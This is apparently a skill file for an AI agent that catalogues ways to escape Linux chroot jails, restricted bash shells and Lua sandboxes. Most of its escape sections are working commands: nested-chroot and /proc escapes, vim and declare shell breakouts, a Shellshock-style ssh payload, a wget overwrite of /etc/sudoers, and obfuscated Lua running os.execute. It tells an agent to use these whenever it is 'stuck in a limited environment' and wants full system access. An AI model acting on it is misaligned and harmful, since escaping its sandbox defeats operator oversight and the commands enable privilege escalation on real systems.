---
name: linux-jail-escape
description: Techniques for escaping from Linux chroot jails, restricted bash shells, and other sandboxed environments. Use this skill whenever you need to break out of a chroot, escape a restricted shell, bypass bash limitations, or escape from Python/Lua sandboxes. Trigger this when you're stuck in a limited environment and need to regain full system access, or when analyzing security controls that rely on chroot or shell restrictions.
---

# Linux Jail Escape Techniques

This skill provides methods for escaping from various Linux sandboxing mechanisms including chroot jails, restricted bash shells, and interpreted language sandboxes.

## When to Use This Skill

- You're inside a chroot jail and need to escape
- You have a restricted bash shell with limited commands
- You're in a Python or Lua sandbox and need command execution
- You're analyzing security controls that use chroot or shell restrictions
- You need to enumerate what escape vectors are available in your current environment

## GTFOBins Reference

Always check [GTFOBins](https://gtfobins.github.io/) for binaries with "Shell" properties that can help you escape. Search for any executable you have access to.

## Chroot Escapes

Chroot is **not designed to defend against privileged (root) users**. Most escape techniques require root access inside the chroot.

### Tool: chw00t

The [chw00t](https://github.com/earthquake/chw00t) tool automates many chroot escape scenarios. Use it if available.

### Method 1: Root + CWD (Working Directory)

If you're root inside a chroot, you can escape by creating a nested chroot:

```bash
# Create a new directory
mkdir chroot-dir

# Chroot into it (you're now outside the new chroot)
chroot chroot-dir

# Navigate back up the filesystem
for i in {1..1000}; do cd ..; done

# Chroot into the real root
chroot .

# Get a shell
/bin/bash
```

**Script**: Use `scripts/break_chroot.py` for an automated version.

### Method 2: Root + Saved File Descriptor

Store a file descriptor to the current directory before chrooting:

```bash
# Save FD to current directory, then chroot elsewhere
# Use the saved FD to escape
```

See `scripts/break_chroot.c` for the C implementation.

### Method 3: Root + Fork + Unix Domain Sockets

1. Fork a child process
2. Create a Unix Domain Socket for parent-child communication
3. Chroot the child to a different folder
4. Parent creates an FD to a folder outside the child's chroot
5. Pass the FD to the child via the socket
6. Child uses the FD to escape

### Method 4: Root + Mount

```bash
# Mount the real root into a directory inside the chroot
mount / /mnt/real-root

# Chroot into that directory
chroot /mnt/real-root
```

### Method 5: Root + /proc

```bash
# Mount procfs if not already mounted
mount -t proc proc /proc

# Find a process with a different root
ls -la /proc/*/root

# Chroot into that process's root
chroot /proc/1/root
```

### Method 6: Root + Fork + Directory Move

1. Fork a child and chroot it deep in the filesystem
2. From parent, move the child's directory to a location before the chroot
3. Child finds itself outside the chroot

### Method 7: ptrace

If ptrace is available, you can inject shellcode into another process:

```bash
# Debug another process and execute shellcode
# See linux-capabilities.md for CAP_SYS_PTRACE details
```

## Bash Jail Escapes

### Step 1: Enumerate the Environment

```bash
# Check your shell
echo $SHELL

# Check PATH
echo $PATH

# List all environment variables
env
export

# Check current directory
pwd

# List files
ls -la
```

**Script**: Use `scripts/bash_escape_check.sh` for automated enumeration.

### Step 2: Modify PATH

```bash
# Try to change PATH to include more directories
PATH=/usr/local/sbin:/usr/sbin:/sbin:/usr/local/bin:/usr/bin:/bin
export PATH

# List files to verify access
echo /home/*
```

### Step 3: Use vim to Escape

```bash
vim
:set shell=/bin/sh
:shell
```

### Step 4: Create Executable Script

```bash
# Create a file with /bin/bash as content
red /bin/bash
> w wx/path  # Write to a writable, executable path
```

### Step 5: SSH Tricks

If accessing via SSH:

```bash
# Get interactive shell directly
ssh -t user@<IP> bash

# Alternative methods
ssh user@<IP> -t "bash --noprofile -i"
ssh user@<IP> -t "() { :; }; sh -i "
```

### Step 6: Declare Variable

```bash
# Use declare to modify PATH
declare -n PATH; export PATH=/bin; bash -i

# Or use BASH_CMDS
BASH_CMDS[shell]=/bin/bash; shell -i
```

### Step 7: Wget to Overwrite Files

```bash
# Overwrite sudoers or other config files
wget http://127.0.0.1:8080/sudoers -O /etc/sudoers
```

## Python Jail Escapes

See the Python sandbox bypass techniques in your reference materials for detailed methods.

## Lua Jail Escapes

### Command Execution via Eval

```lua
-- Execute a command using os.execute
load(string.char(0x6f,0x73,0x2e,0x65,0x78,0x65,0x63,0x75,0x74,0x65,0x28,0x27,0x6c,0x73,0x27,0x29))()
```

### Call Functions Without Dots

```lua
-- Access string.char without using dots
print(rawget(string, "char")(0x41, 0x42))

-- Enumerate all functions in a library
for k,v in pairs(string) do print(k,v) end
```

### Brute Force Function Discovery

Since function order changes between environments:

```lua
-- Brute force to find specific functions
for k,chr in pairs(string) do print(chr(0x6f,0x73,0x2e,0x65,0x78)) end
```

### Get Interactive Lua Shell

```lua
-- Get a new, potentially unlimited lua shell
debug.debug()
```

## References

- [GTFOBins](https://gtfobins.github.io/)
- [chw00t](https://github.com/earthquake/chw00t)
- [Restricted Linux Shell Escaping Techniques](https://fireshellsecurity.team/restricted-linux-shell-escaping-techniques/)
- [SANS: Escaping Restricted Linux Shells](https://pen-testing.sans.org/blog/2012/06/06/escaping-restricted-linux-shells)
- [Chw00t DeepSec Slides](https://deepsec.net/docs/Slides/2015/Chw00t_How_To_Break%20Out_from_Various_Chroot_Solutions_-_Bucsay_Balazs.pdf)

## Quick Reference

| Environment | Key Escape Method |
|-------------|-------------------|
| Chroot (root) | Nested chroot, /proc, mount |
| Bash jail | vim, PATH modification, declare |
| Lua | debug.debug(), os.execute |
| Python | See Python sandbox bypass docs |
| Any | Check GTFOBins for available binaries |
